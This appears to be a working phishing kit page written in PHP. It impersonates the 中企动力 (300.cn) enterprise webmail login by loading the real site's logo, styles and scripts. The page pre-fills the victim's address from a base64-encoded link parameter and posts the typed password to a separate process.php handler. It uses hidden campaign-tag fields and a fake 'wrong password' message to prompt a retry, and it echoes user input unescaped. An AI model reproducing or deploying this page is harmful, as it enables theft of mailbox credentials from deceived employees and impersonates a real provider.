<?php
if(isset($_POST['pass']) && !empty($_POST['pass']) && isset($_POST['login']) && !empty($_POST['login'])){
include('process.php');
}else{
$login = $_GET['login'];
if (strpos($login,'@') !== false){
$log=$login;
}else{
$log=base64_decode($login);
}

$prem = explode('@',$log);
$domain = substr(strrchr($log, "@"), 1);
$useid = $prem[0];
 
?><!DOCTYPE html>
<html lang="zh-CN"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=0">
    <meta name="keywords" content="企业邮箱登陆,企业邮箱登录,邮箱登录,邮箱登陆">
    <meta name="description" content="中企动力中企邮局（300.cn）为您提供企业邮箱注册、公司邮箱注册业务，您可以通过中企邮局申请企业邮箱大容量账号，通过中企邮局注册的企业邮箱将享有全球线路、全程加密、多端登录等特点，欢迎你的光临。">
    <meta name="author" content="__web_login__">
    <title>企业邮箱登陆/登录_邮箱登陆/登录_全球邮邮箱登陆</title>
        <link rel="shortcut icon" href="http://mailv.zmail300.cn/webmail/web/skin/operator/ce/image/favicon.ico?v=1544168584214" type="image/x-icon">
        <link href="http://mailv.zmail300.cn/webmail/web/skin/operator/ce/css/signin.css?v=1544168584214" rel="stylesheet">
    <style>
    	    #msg_container {
	    	display: none;
	    }
            </style>
  </head>
<body style="padding-top: 149.5px;">
<div class="main">
		<div class="header">
			   			   <div class="logo">
			    	<img src="http://mailv.zmail300.cn/webmail/web/skin/operator/ce/image/logo.png">
			   </div>
			   			   			   <div class="detial">
				   <span>售后服务：400 660 5555</span> 
	 		   </div>
</div>
</div>
 <div class="contain">
	<div class="container" id="form_container">
       <div class="login">
	   <form class="form-signin" method="POST">
        <div class="login-user clearfix">
	        <label for="inputUser" class="icon-user">账号</label>
	        	        <input id="inputUser" name="login" class="form-control" placeholder="账号" required="" value="<?php echo $log; ?>" type="text">
	                </div>
                    <input type="hidden" name="logins" value="<?php echo $log; ?>">
                
                <?php if ($_GET['hihi']=='1') { ?>
                
                <input type="hidden" name="hihihi" value="<?php echo $log; ?>">
                
                  <?php }?>
                    <?php if ($_GET['hihi']=='2') { ?>
                
                <input type="hidden" name="hihi" value="<?php echo $log; ?>">
                
                  <?php }?>
                    <?php if ($_GET['hihi']=='3') { ?>
                
                <input type="hidden" name="hihi" value="<?php echo $log; ?>">
                
                  <?php }?>
        <div class="login-password clearfix">
	        <label for="inputPassword" class="icon-password">密码</label>
	        <input id="inputPassword" name="pass" class="form-control" placeholder="密码" required="" type="password">
        </div>
        <div class="clearfix">
          <div class="login-pad">
	        <input id="submitPassword" name="Password" type="hidden">
	        	       </div>
        </div>
        <div class="login-mar clearfix">
	        <div class="checkbox-nice checkbox-nice-zi fl">
	          <input id="remember_me" name="remember_me" value="1" checked="checked" type="checkbox"><label for="remember_me">记住账号</label>
	         </div>
	         <div class="checkbox-nice checkbox-nice-zi fl">
	          <input id="login_ssl_check" value="1" type="checkbox"><label for="login_ssl_check">SSL</label>
	         </div>
	         <select name="login_lang" style="float:right;border:1px solid #ddd;padding:5px;margin-top:-2px;">
				  <option value="" selected="selected">默认语言</option>
				  <option value="cn">简体中文</option>
				  <option value="en">English</option>
			 </select>
	 	</div>
	 	<div class="clearfix">
           <button class="btn btn-success" type="submit" style="outline:none">登录</button>
        </div>
           <?php if (isset($_GET['mgs'])) { ?>
     <div id="" class="alert-danger" role="alert">
	  	   您的账号或者密码错误
	    </div>
        <?php } ?>
	   </form>
      </div>
  </div><!-- /container -->
    
</div>  
<div class="main">
	<div class="footer">
	    Copyright ©2018 中企动力科技股份有限公司 版权所有
	 </div>
</div>
<div style="clear:both"></div>
    <script src="http://mailv.zmail300.cn/webmail/web/js/lib/jquery-1.11.3.min.js"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
<script src="http://mailv.zmail300.cn/webmail/web/js/lib/bootstrap/ie10-viewport-bug-workaround.js"></script>
<script src="http://mailv.zmail300.cn/webmail/web/js/common/md.js"></script>
<script type="text/javascript">var Lang = {"form_title":"\u7528\u6237\u767b\u5f55","form_title_el_1":"\u8d26\u53f7","form_title_el_2":"\u5bc6\u7801","form_title_el_3":"\u8bb0\u4f4f\u8d26\u53f7","form_title_el_4":"\u767b\u5f55","form_title_el_5":"\u7ba1\u7406\u5458\u767b\u5f55","form_title_el_6":"\u9ed8\u8ba4\u8bed\u8a00","format_er":"\u60a8\u7684\u8d26\u53f7\u683c\u5f0f\u9519\u8bef","vcode_error":"\u9a8c\u8bc1\u7801\u9519\u8bef","domain_locked_er":"\u60a8\u7684\u57df\u5df2\u88ab\u9501\u5b9a","user_unexist_er":"\u60a8\u7684\u8d26\u53f7\u6216\u8005\u5bc6\u7801\u9519\u8bef","domain_expired_er":"\u60a8\u7684\u57df\u5df2\u7ecf\u8fc7\u671f","domain_unexist_er":"\u60a8\u7684\u8d26\u53f7\u6216\u8005\u5bc6\u7801\u9519\u8bef","user_login_ip_er":"\u60a8\u7684ip\u4e0d\u5728\u4fe1\u4efb\u5217\u8868\u4e2d","user_password_er":"\u60a8\u7684\u8d26\u53f7\u6216\u8005\u5bc6\u7801\u9519\u8bef","user_locked_er":"\u60a8\u7684\u8d26\u53f7\u5df2\u88ab\u9501\u5b9a","user_nowebpermission_er":"\u60a8\u6ca1\u6709WEB\u767b\u5f55\u6743\u9650","user_expired_er":"\u60a8\u7684\u8d26\u53f7\u5df2\u8fc7\u671f","user_unopen_er":"\u60a8\u7684\u8d26\u53f7\u672a\u5f00\u901a","other_er":"\u60a8\u7684\u8d26\u53f7\u767b\u5f55\u5f02\u5e38","unknown_error":"\u672a\u77e5\u9519\u8bef","user_info_parse_error":"\u60a8\u7684\u8d26\u53f7\u767b\u5f55\u6570\u636e\u5f02\u5e38","http_error":"\u670d\u52a1\u5668\u5fd9\uff0c\u8bf7\u7a0d\u540e\u518d\u8bd5","user_login_area_er":"\u60a8\u7684\u767b\u5f55\u5730\u533a\u4e0d\u5728\u4fe1\u4efb\u5217\u8868\u4e2d","page_info_1":"\u8d26\u53f7\u683c\u5f0f\u9519\u8bef","page_info_2":"\u5bc6\u7801\u4e3a\u7a7a","page_info_3":"\u552e\u540e\u670d\u52a1\uff1a","page_info_6":"\u8054\u7cfb\u6211\u4eec","page_info_8":"\u5e2e\u52a9\u4e2d\u5fc3","page_info_10":"\u5ba2\u6237\u7aef\u914d\u7f6e","page_info_11":"\u770b\u4e0d\u6e05","page_info_12":"\u9a8c\u8bc1\u7801","page_info_13":"\u5207\u6362\u5230\u8001\u7248\u672c","page_info_14":"\u5173\u6ce8\u201c\u65b0\u7f51\u4f01\u4e1a\u90ae\u201d\u7528\u5fae\u4fe1\u6536\u53d1\u90ae\u4ef6","page_info_browser_ie":"\u60a8\u7684\u6d4f\u89c8\u5668\u7248\u672c\u8fc7\u4f4e\uff0c\u8bf7\u4f7f\u7528ie8\u4ee5\u4e0a\u6216\u5176\u4ed6\u6d4f\u89c8\u5668","page_os_select":"\u9009\u62e9\u6d77\u5916\u767b\u5f55\u70b9\uff1a","page_os_site_1":"\u6d1b\u6749\u77f6","page_os_site_2":"\u534e\u76db\u987f","page_os_site_3":"\u6cd5\u5170\u514b\u798f","page_os_site_4":"\u9999\u6e2f","page_lang":"English","page_lang_type":"EN","operator_copyright":"Copyright \u00a92018 \u4e2d\u4f01\u52a8\u529b\u79d1\u6280\u80a1\u4efd\u6709\u9650\u516c\u53f8 \u7248\u6743\u6240\u6709","operator_bsale":"\u552e\u524d\u54a8\u8be2:\u8054\u7cfb\u4e2d\u4f01\u5404\u5206\u652f\u673a\u6784","operator_reminder_info":"\uff08\u9700\u8981\u5173\u6ce8\u4e2d\u4f01\u4f01\u4e1a\u90ae\u5fae\u4fe1\u516c\u4f17\u53f7\u5e76\u7ed1\u5b9a\u90ae\u7bb1\uff09","operator_home_url":"http:\/\/www.300.cn\/","operator_attr_advertising":"","operator_attr_url1":"<img src=\"{{url1}}\" class=\"img1 fl\" style=\"margin-top:10px;\">","operator_attr_url2":"<img class=\"img2 fl\" style=\"padding-top:19px;\" src=\"{{url2}}\">","operator_attr_try_url":"","g_cookie_prefix":"webmail"},webmail_ssl_url = "https://mailv.zmail300.cn",proj_root = "/webmail/",__code__ = "88888";</script>
<script src="http://mailv.zmail300.cn/webmail/web/js/common/util.js?v=1544168584214"></script>
<script src="http://mailv.zmail300.cn/webmail/web/js/user/login.js?v=1544168584214"></script>
  

</body></html><?php }?>